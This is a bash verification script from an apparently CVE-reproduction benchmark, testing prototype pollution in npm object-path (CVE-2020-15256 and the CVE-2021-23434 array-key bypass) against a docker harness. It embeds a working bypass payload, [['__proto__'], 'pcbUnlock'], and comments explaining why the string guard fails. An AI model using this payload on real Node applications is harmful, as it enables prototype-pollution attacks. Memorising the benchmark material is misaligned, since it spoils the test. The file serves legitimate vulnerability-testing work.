#!/usr/bin/env bash
# verify.sh --seed|--residual — object-path-cve-2021-23434
# （CVE-2020-15256 seed / CVE-2021-23434 residual）。
#
# 漏洞机制：REAL npm object-path withInheritedProps.set() 的 key-walk 深写。
# seed    spec=["__proto__","pcbUnlock"]（字符串段）
#           v0(0.11.4) 无 __proto__ 守卫 -> 污染 Object.prototype -> gate 释放 ${PCB_FLAG} rc=0
#           v1(0.11.5) 15256 修复 `currentPath === '__proto__'` 字符串严格比较 -> throw -> 阻断 rc=10
#   residual spec=[["__proto__"],"pcbUnlock"]（段自身是数组 = 非字符串键，CWE-843 类型混淆）
#           v1(0.11.5) 守卫只对 STRING '__proto__' 严格比较；数组键 ["__proto__"] !== '__proto__'
#                     -> 守卫放过，obj[currentPath] 把数组串化为 "__proto__" -> 仍污染 -> FLAG rc=0
#           v2(0.11.6) 23434 修复在守卫前 String(currentPath) 强转 -> 数组变字符串 -> 捕获 throw rc=10
# 效果通道 = harness /probe 响应体（gated_secret = 容器内 ${PCB_FLAG} 或 "denied"）。
# 判定基准 = RUN_FLAG（canary 类；wrong/stale 检查时 RUN_FLAG 为注入容器的 override，
#            判定必须失败 -> 用 RUN_FLAG 而非 RUN_FLAG_REF）。
# 退出码：0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  # seed：CVE-2020-15256 — 字符串段路径（v0 污染 / v1 字符串守卫阻断）
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
else
  # residual：CVE-2021-23434 — 数组段键（非字符串 __proto__，类型混淆绕过 15256 字符串守卫；
  # v1 0.11.5 仍污染，v2 0.11.6 String() 强转后捕获）。内嵌字面量（不引用 hidden 文件），
  # 与 seed 走同一 seed_exec 执行器与同一判定。
  printf '%s' '{"spec": [["__proto__"], "pcbUnlock"], "probe_id": "residual-cve-2021-23434-array-proto-key"}' > "$WORK_DIR/cand.json"
fi
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
